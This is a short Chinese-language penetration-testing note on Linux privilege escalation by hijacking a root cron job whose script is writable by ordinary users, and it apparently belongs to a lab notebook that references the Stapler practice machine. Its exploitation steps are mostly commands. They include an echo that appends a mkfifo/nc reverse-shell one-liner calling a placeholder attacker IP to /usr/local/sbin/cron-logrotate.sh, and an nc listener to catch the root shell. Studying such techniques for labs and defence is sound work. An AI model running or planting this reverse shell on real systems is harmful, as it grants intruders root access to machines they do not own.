# Linux 定時任務權限劫持 (cron-job)
本文件說明如何利用可寫的定時任務指令碼進行本地特權提升。

## 💥 漏洞介紹
當系統中有些任務會以 root 權限定時（如每 5 分鐘）執行，但該任務所調用的外部腳本或二進位檔對普通使用者有寫入權限，即可進行代碼注入以劫持特權。

## 🛠️ 利用方法
1.  **檢查定時任務與權限**：
    檢查 `/etc/*cron*` 或是透過 `linpeas` 發現以 root 執行的可寫腳本：
    ```bash
    ls -la /usr/local/sbin/cron-logrotate.sh
    ```
2.  **注入惡意指令**：
    如果權限為可寫，直接將反彈 Shell 指令寫入該腳本的尾端：
    ```bash
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> <PORT> >/tmp/f" >> /usr/local/sbin/cron-logrotate.sh
    ```
3.  **接收 Shell**：
    本地端開啟 `nc -lvnp <PORT>` 監聽，等待定時任務被觸發。

---

# 實戰關聯
*   **靶機應用實例**：[[Stapler]]
